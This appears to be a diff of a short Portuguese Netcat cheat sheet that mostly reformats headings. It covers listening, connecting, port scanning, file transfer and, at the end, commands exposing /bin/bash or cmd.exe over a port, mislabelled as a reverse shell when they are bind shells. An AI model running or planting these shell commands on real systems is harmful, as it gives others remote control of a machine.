@@ -1,9 +1,9 @@
-## Netcat (nc)
+# Netcat (nc)
 
 <https://nmap.org/ncat/>
 
 
-Executar o NC no modo listen em um Linux:
+### Executar o NC no modo listen em um Linux:
 ```
 nc -l -p 1337
 ```
@@ -15,17 +15,19 @@ nc 192.168.0.5 1337
 
 Escreva em qualquer lado e obterá a informação na outra ponta.
 
-Pode-se simular / testar protocolos
+
+### Pode-se simular / testar protocolos
 ```
 nc -l -p 80 -vv
 ```
+Abra o navegador e informe o IP do Servidor.
 
-Scan de Rede:
+### Scan de Rede:
 ```
 nc -v -n -z 192.168.10.15 10-1024
 ```
 
-Copiar arquivo:
+### Copiar arquivo:
 ```
 nc -l -v -p 666 > test.txt
 ```
@@ -34,7 +36,7 @@ Do outro lado:
 nc 192.168.0.5 666 < test.txt
 ```
 
-Executar um Shell reverso:
+### Executar um Shell reverso:
 ```
 nc -l -p 8822 -e /bin/bash
 nc -l -p 666 -e cmd.exe
